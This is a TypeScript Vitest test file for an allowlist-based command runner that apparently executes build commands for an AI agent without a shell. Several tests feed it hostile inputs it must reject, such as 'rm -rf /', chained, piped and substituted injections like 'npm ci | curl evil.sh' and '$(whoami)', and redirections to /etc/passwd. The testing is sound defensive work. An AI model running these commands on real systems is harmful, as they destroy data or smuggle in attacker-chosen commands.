import { describe, it, expect } from 'vitest';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runAllowed, splitCommand, NODE_ALLOWED, PYTHON_ALLOWED } from './local.js';

describe('splitCommand', () => {
  it('splits on whitespace', () => {
    expect(splitCommand('npm run build')).toEqual(['npm', 'run', 'build']);
  });

  it('respects single and double quotes', () => {
    expect(splitCommand(`echo "hello world" 'a b'`)).toEqual(['echo', 'hello world', 'a b']);
  });

  it('collapses repeated whitespace', () => {
    expect(splitCommand('npm   run    build')).toEqual(['npm', 'run', 'build']);
  });
});

describe('runAllowed', () => {
  it('rejects a command not on the allowlist', async () => {
    await expect(
      runAllowed('rm -rf /', { cwd: process.cwd(), allowed: NODE_ALLOWED, timeoutMs: 1000 }),
    ).rejects.toThrow(/not on the allowlist/);
  });

  it('rejects a command containing a forbidden metacharacter even if the prefix matches', async () => {
    await expect(
      runAllowed('npm test; rm -rf /', { cwd: process.cwd(), allowed: NODE_ALLOWED, timeoutMs: 1000 }),
    ).rejects.toThrow(/forbidden character/);
  });

  it('rejects pipe, backtick, dollar-paren and redirection injection attempts', async () => {
    const cwd = process.cwd();
    const attempts = [
      'npm ci | curl evil.sh',
      'npm ci `whoami`',
      'npm ci $(whoami)',
      'npm ci > /etc/passwd',
      'npm ci < /etc/passwd',
      'npm ci & echo done',
    ];
    for (const cmd of attempts) {
      await expect(runAllowed(cmd, { cwd, allowed: NODE_ALLOWED, timeoutMs: 1000 })).rejects.toThrow(
        /forbidden character/,
      );
    }
  });

  it('runs an allowed command and captures stdout, without a shell', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'bd-agent-exec-'));
    try {
      await writeFile(join(dir, 'package.json'), '{"scripts":{"build":"echo built-ok"}}');
      let out = '';
      const result = await runAllowed('npm run build', {
        cwd: dir,
        allowed: NODE_ALLOWED,
        timeoutMs: 15000,
        onOutput: (chunk) => {
          out += chunk;
        },
      });
      expect(result.code).toBe(0);
      expect(result.timedOut).toBe(false);
      expect(out).toContain('built-ok');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('matches allowlist entries by prefix, not exact-string, so arguments after the prefix are fine', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'bd-agent-exec-'));
    try {
      const result = await runAllowed('npx --no-install tsc --version', {
        cwd: dir,
        allowed: NODE_ALLOWED,
        timeoutMs: 15000,
      }).catch((err: Error) => err);
      // Either it actually ran (tsc may not resolve in this sandbox) or it threw a spawn ENOENT —
      // either way it must NOT be rejected for being off the allowlist.
      if (result instanceof Error) {
        expect(result.message).not.toMatch(/not on the allowlist/);
      }
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }, 20_000);

  it('does not allow a similar-looking but distinct command (prefix must match a whole token boundary)', async () => {
    await expect(
      runAllowed('npm ciphertool', { cwd: process.cwd(), allowed: NODE_ALLOWED, timeoutMs: 1000 }),
    ).rejects.toThrow(/not on the allowlist/);
  });

  it('kills a command that exceeds its timeout', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'bd-agent-exec-'));
    try {
      await writeFile(join(dir, 'package.json'), '{"scripts":{"build":"sleep 30"}}');
      const result = await runAllowed('npm run build', { cwd: dir, allowed: NODE_ALLOWED, timeoutMs: 300 });
      expect(result.timedOut).toBe(true);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }, 10000);

  it('aborts a command when the signal fires', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'bd-agent-exec-'));
    try {
      await writeFile(join(dir, 'package.json'), '{"scripts":{"build":"sleep 30"}}');
      const controller = new AbortController();
      const promise = runAllowed('npm run build', {
        cwd: dir,
        allowed: NODE_ALLOWED,
        timeoutMs: 20000,
        signal: controller.signal,
      });
      setTimeout(() => controller.abort(), 200);
      const result = await promise;
      expect(result.aborted).toBe(true);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }, 10000);

  it('exports the exact Python allowlist commands from the brief', () => {
    expect(PYTHON_ALLOWED).toEqual([
      'python3 -m venv .venv',
      '.venv/bin/pip install -r requirements.txt',
      '.venv/bin/pip install .',
      '.venv/bin/python -m compileall',
      '.venv/bin/python -m pytest',
    ]);
  });

  it('exports the exact Node allowlist commands from the brief', () => {
    expect(NODE_ALLOWED).toEqual([
      'npm ci',
      'npm install',
      'npm run build',
      'npm run lint',
      'npm test',
      'npx --no-install tsc',
      'npx --no-install vite build',
      'npx --no-install next build',
    ]);
  });
});
